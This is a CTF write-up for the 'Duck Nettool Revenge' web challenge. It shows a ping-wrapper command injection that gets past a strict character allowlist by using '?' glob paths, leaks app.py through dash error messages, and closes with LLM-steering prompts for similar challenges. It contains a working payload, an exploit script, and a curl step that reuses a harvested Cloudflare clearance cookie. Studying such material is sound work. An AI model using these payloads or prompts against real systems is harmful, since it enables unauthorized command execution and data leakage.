---
title: "Duck Nettool Revenge"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: web
difficulty: medium
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, web, ai-assisted]
draft: false
summary: "Command injection through a brutally restrictive character-set filter, solved by globbing binaries with ? wildcards and tricking dash into leaking app.py through its own error messages."
icon: "🦆"
---

## Summary

Duck Nettool Revenge is a `ping` wrapper that concatenates user input straight into a `shell=True` command, but guards it with a regex that allows only `i`, digits, `.`, `;`, `?`, `/`, and space. The intended path is command injection where every binary and filename is spelled out with `?` glob wildcards instead of letters, and the flag is exfiltrated not by reading `flag.txt` (it is `chmod 0000`) but by handing the readable `app.py` to `dash`, whose "command not found" error dutifully prints the Python docstring containing the flag. I ran this one as a steering exercise: I recognized the challenge class and pointed an LLM at the filter and the Dockerfile, let it grind through the glob enumeration, and corrected it when it tried to read the wrong file.

## Solution

### Reading the target before reading the app

The single most important judgment call here happened before any payload existed, and it is exactly the kind of thing I lean on an LLM to do exhaustively: read the *deployment*, not just `app.py`. The challenge ships a Flask app, a `Dockerfile`, a `docker-compose.yml`, a `flag.py`, a `flag.txt`, and a template. The naive instinct is "RCE, then `cat flag.txt`." That instinct is wrong here, and the Dockerfile is what tells you so.

Three facts from the build decide the entire approach:

- `flag.txt` is `chmod 0000` and owned by `root`. The app runs as an unprivileged `ctf` user. There is no reading that file without privilege escalation, and there is no privesc in this challenge.
- `flag.py` is just `print('FLAG')`. It is a decoy. Chasing it is a dead-end.
- `app.py` is owned by `ctf`, so the app user *can* read it, and its module docstring literally contains the flag line: *"The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable..."*

The challenge infrastructure substitutes the real flag for `v1t{fake_flag}` on the remote. So the win condition is not "read the protected file"; it is "make the process dump its own readable source." Once that reframing lands, the whole puzzle narrows to: get arbitrary command execution, then print `app.py`.

### The vulnerable sink and the filter

The sink is unambiguous:

```python
ALLOWED_TARGET_RE = re.compile(r"^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$")

@app.route("/", methods=["GET", "POST"])
def index():
    target = request.form.get("target", "")
    if not ALLOWED_TARGET_RE.fullmatch(target):
        return ... "Only host-like characters are allowed"
    command = f"ping -c 1 {target}"
    output = subprocess.check_output(command, shell=True, stderr=STDOUT,
                                     timeout=5, text=True, env={"PATH": "/bin:/usr/bin"})
```

`shell=True` with our string interpolated directly into the command means classic shell injection. The only thing standing in the way is `ALLOWED_TARGET_RE`. Decompose it carefully, because every solvable thing in this challenge lives in the gaps:

- **Allowed character class:** `[i0-9.;?/ ]` — the single letter `i`, all digits, dot, semicolon, question mark, slash, and space. Nothing else.
- **Two negative lookaheads:** `(?!.* \.)` forbids the substring `" ."` (space then dot) anywhere, and `(?!.*\. )` forbids `". "` (dot then space) anywhere.

Take inventory of what survives. We have `;`, a command separator, so we can chain a second command after `ping`. We have `?`, which is a single-character glob wildcard in the shell. We have `/`, so we can build absolute paths. We have `.` and digits and `i`. We do **not** have: any letter except `i`, so no `cat`, `sh`, `python`, `bash`, `ls` typed literally; no `*` for multi-char globbing; no `` ` ``, `$`, `(`, quotes for substitution; no `<`, `>`, `|`, `&` for redirection or piping; no `-` for flags.

That last one matters more than it looks. No `-` means no `cat -`, no `tail`, no command flags of any kind. No `>` means no writing files. No `*` means every glob has to match an *exact length* with `?`. And no letters means we cannot name a single binary or file directly — we have to describe them by shape.

The lookaheads are the subtle part. Why specifically forbid `" ."` and `". "`? Because the author anticipated the cleanest exfil primitive: `. app.py`, the shell `source` builtin (dot-space-filename), and the relative path form `./something`. Forbidding dot-space kills `. app.py`; the design is deliberately aimed at the obvious shortcut. Recognizing *why* a filter forbids exactly those two digraphs is what tells you the intended solution routes around sourcing — and that is precisely the kind of "read the adversary's intent" reasoning I made sure the model did out loud rather than brute-forcing payloads.

### Naming binaries with `?` globs

We need to execute something, but we cannot type its name. The shell's `?` glob matches exactly one character, and `/` lets us anchor into real directories. So we describe the *path shape* of the binary we want and let the shell expand it.

The target is a shell. In this image, `/bin/sh` is `dash`. The enumeration that actually works (run inside the real container to confirm matches are unique):

```
/?i?/??   →  /bin/sh
```

Walk the pattern: `/` then three characters where the middle is literally `i` (`?i?` matches `bin` because of the `i` in the middle), then `/`, then exactly two characters (`??` matches `sh`). The `i` is doing real work: `/???/??` would *also* match other directories of the right shape (it can pick up things like `/dev/fd` or `/sys/fs`), so anchoring on the `i` in `bin` is what makes the expansion resolve uniquely to `/bin/sh`. This was the first place I had to correct the model — it initially proposed `/???/??`, which is ambiguous and can expand to multiple paths, breaking the command. Pinning on the `i` is the fix.

For the file to read, the working directory is `/app` and `app.py` is the only file matching three-chars-dot-two-chars:

```
???.??    →  app.py
```

`???` matches `app`, `.` is literal, `??` matches `py`. Clean and unique in `/app`.

### The exfil trick: dash leaking Python through error messages

Here is the genuinely clever part, and the reason `flag.txt` being unreadable does not matter. We hand `app.py` to `dash` as a script argument:

```
/bin/sh app.py
```

`dash` tries to interpret `app.py` as a shell script. It is not one — it is Python. But it parses line by line, and crucially, `app.py` begins with a triple-quoted module docstring. To `dash`, `"""` is not special; the entire triple-quoted block becomes one enormous "word." When `dash` tries to run the first line as a command, the whole docstring becomes a single command name, which does not exist, so it prints a "not found" error that *echoes the offending token back at you* — and that token is the docstring text, flag and all:

```
$ /bin/sh app.py
app.py: 12:
TODO / Deployment fixes
...
- The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable,   ← flag line
...
: not found
app.py: 13: import: not found
...
```

The error stream is captured because the app sets `stderr=STDOUT`, so the docstring comes right back in the HTTP response `<pre>`. This is the second place I had to steer: the model first reached for `cat app.py`-style reads (impossible — no letters) and then for sourcing with `.` (blocked by the dot-space lookahead). The insight that *the error message itself is the exfil channel* is what unlocks it. Running the file as a script argument, rather than sourcing it, also sidesteps the `". "`/`" ."` lookaheads entirely, because there is never a dot adjacent to a space in the payload.

### Assembling the payload

Chain it after `ping` with `;`:

```
;/?i?/?? ???.??
```

The server builds and runs:

```
ping -c 1 ; /bin/sh app.py
```

Check it against the filter one more time, because a single illegal character rejects the whole request. Characters used: `;`, `/`, `?`, `i`, space, `.`. All in the allowed class. Adjacent pairs: `;/`, `/?`, `?i`, `i?`, `?/`, `?<space>`, `<space>?`, `?.`, `.?` — none of them is `" ."` or `". "`. It passes.

### End-to-end script

Stand up the challenge locally (the remote is behind a Cloudflare managed-challenge captcha; solve and validate locally, then submit the same payload through a real browser on the remote, where the flag substitution happens). This one script goes from raw challenge directory to printed flag:

```bash
#!/usr/bin/env bash
set -euo pipefail

# --- 1. Build and run the challenge exactly as deployed ---
docker build -t duckrev .
docker rm -f duckrev_t 2>/dev/null || true
docker run -d --name duckrev_t \
  --read-only --tmpfs /tmp --tmpfs /run \
  --cap-drop ALL --cap-add NET_RAW \
  -p 5001:5000 duckrev

# give the Flask app a moment to bind
until curl -s -o /dev/null http://127.0.0.1:5001/; do sleep 0.3; done

# --- 2. Fire the injection payload ---
# target = ;/?i?/?? ???.??  ->  ping -c 1 ; /bin/sh app.py
PAYLOAD=';/?i?/?? ???.??'
RESP="$(curl -s -X POST --data-urlencode "target=${PAYLOAD}" http://127.0.0.1:5001/)"

# --- 3. Extract the flag line from dash's error output ---
echo "$RESP" | grep -oE 'v1t\{[^}]*\}' | head -n1

# Cleanup
docker rm -f duckrev_t >/dev/null
```

Locally this prints the placeholder `v1t{fake_flag}`, which confirms the technique end to end. On the remote, the identical payload in the target box returns the real flag on the "SHA-256 hash of ..." line, because the infrastructure swaps the placeholder for the real value.

For the remote submission via CLI (only if you have harvested a `cf_clearance` cookie and matching User-Agent from a passed browser challenge):

```bash
curl -X POST 'https://api.v1t.site/' \
  -H 'Cookie: cf_clearance=<TOKEN>' -H 'User-Agent: <UA>' \
  --data-urlencode 'target=;/?i?/?? ???.??'
# URL-encoded payload: %3B/%3Fi%3F/%3F%3F%20%3F%3F%3F.%3F%3F
```

## Flag

```
v1t{br0_th15_15_duck}
```

(The local container only ever emits the placeholder `v1t{fake_flag}`; the value above is the real flag returned by the remote, where the substitution happens.)

## Lessons learned - prompting the AI

Whenever you face a **shell command injection that is gated by a character-set allowlist** (a regex like `[a-z0-9.]+`, `[i0-9.;?/ ]+`, "only host-like characters", "alphanumeric only", a printf/ping/nslookup wrapper that whitelists a tiny alphabet), the solve is never about the injection itself — `shell=True` already lost — it is about *spelling your command out of the surviving alphabet*. The transferable skill is teaching the model to (1) triage the deployment for which file is actually readable, (2) treat the surviving characters as a hard constraint and build binary/filename names out of globs, and (3) find an output channel that survives the missing characters (often the *error* stream). The prompts below are written to work on the next allowlist-injection challenge, not just this duck.

**Prompt 1 — triage readability from the deployment before touching the injection.** The expensive default mistake of this whole class is "RCE then `cat flag.txt`," when the flag is usually somewhere else readable (source, env, a docstring, a world-readable config). Make the model commit to a target file first:

> "Here are app.py, the Dockerfile, and docker-compose.yml. Before proposing any exploit, list every file that could contain the flag (flag.txt, flag.py, app.py, env, configs), and for each one tell me — from the Dockerfile's chmod/chown lines and the USER directive — whether the *process user* can read it. Rank them by readability and pick the realistically readable target. Assume there is no privilege escalation."

This generalizes directly: on any sandboxed-injection challenge, the Dockerfile's `chmod 0000`, `chown root`, and `USER` lines tell you the flag is bait and the source is the prize. Anchoring on permissions first is what stops the model burning rounds on an unreadable file.

**Prompt 2 — force payload construction inside the surviving alphabet, and demand uniqueness.** Hand the model the exact allowlist and make it reason about what is *left*, not what it wishes it had:

> "The filter allows ONLY these characters: <paste the exact class, e.g. i 0-9 . ; ? / space> and forbids the substrings <paste any blocked digraphs>. Treat `?` as a single-character glob and `/` as a path separator. Without using any forbidden character, build glob patterns that name (a) a shell binary and (b) the source file. Each pattern must expand to EXACTLY ONE path inside the real container — show me the length count and why no other path matches."

The word "uniquely" / "exactly one path" is load-bearing for this entire class. Left alone the model emits `/???/??` (matches `/bin/sh` but also `/dev/fd`, `/sys/fs`, etc.). Forcing uniqueness is what produces an anchored pattern like `/?i?/??` (pinning the `i` in `bin`). Same trick recurs everywhere: use whichever allowed letter happens to sit inside the directory/binary name to disambiguate.

**Prompt 3 — name the output channel that survives the missing characters.** When you have no `cat`, no `<`/`>`/`|`, and no quotes, you cannot "read" a file the normal way — you make a program emit it as a side effect. Point the model at the error stream:

> "I cannot type `cat`, cannot redirect (`>`/`|` are filtered), and the `source` form `. file` is blocked. The app captures stderr (`stderr=STDOUT`) into the HTTP response. Give me a way to make a shell or interpreter PRINT the contents of <file> through its own error/diagnostic output — e.g. feeding a non-script file to `/bin/sh` so the 'not found' error echoes the offending lines back."

This is the reusable insight of the class: when normal reads are filtered, **the error message is the exfil channel.** Feeding a Python/JSON/config file to `dash`, passing a malformed arg that gets echoed, a syntax error that prints the offending line — all variants of "let the diagnostics leak the bytes." Tell the model the exact mechanism that captures stderr so it reaches for it.

**What to tell the model to focus on, and the dead-ends to forbid up front.** Focus: (1) file-permission triage from the Dockerfile *first*; (2) the surviving character set as an inviolable constraint; (3) glob *uniqueness* inside the real filesystem; (4) error output as an exfil channel. Dead-ends to ban explicitly at the start of the conversation, because every model reaches for them on this class: do **not** try to read the obvious `flag.txt` (it is the bait — usually `0000`/root); do **not** chase decoy files like `flag.py`; do **not** propose any character outside the allowlist (`*`, `-`, `>`, `|`, backticks, `$()`, quotes) — re-read the class before each payload; and do **not** use a blocked digraph (here `" ."`/`". "`, which exist specifically to kill `. file` sourcing and `./` paths). Naming these up front saves several wasted rounds.

**How to verify the output for this class (catching hallucinations).** Two checks catch essentially every model mistake here. First, **expand every glob in the real container before trusting it**: `docker run --rm <image> /bin/sh -c 'echo /?i?/??; echo ???.??'` — if a pattern prints more than one path (or the wrong one), it is ambiguous and the payload will silently break; this is exactly how I caught `/???/??`. Second, **re-validate the final payload string character-by-character against the actual regex, lookaheads included**, before sending — paste the candidate into a one-liner like `python -c "import re;print(bool(re.compile(r'<the regex>').fullmatch('<payload>')))"`. One illegal character rejects the whole request and wastes a round-trip, and the model is bad at spotting a stray forbidden digraph. The model proposes; you own the expand-and-revalidate loop.

**Fast-path prompt recipe for the class:** "Allowlist-gated shell injection — from the Dockerfile tell me which file the process user can actually read (the flag.txt is probably bait), then using ONLY the surviving characters name every binary and file with `?` globs that expand to exactly one path, and leak the file through an error/diagnostic channel since cat and redirection are filtered; never emit a character outside the class or a forbidden digraph, and I will expand each glob and re-check each payload against the regex before sending."
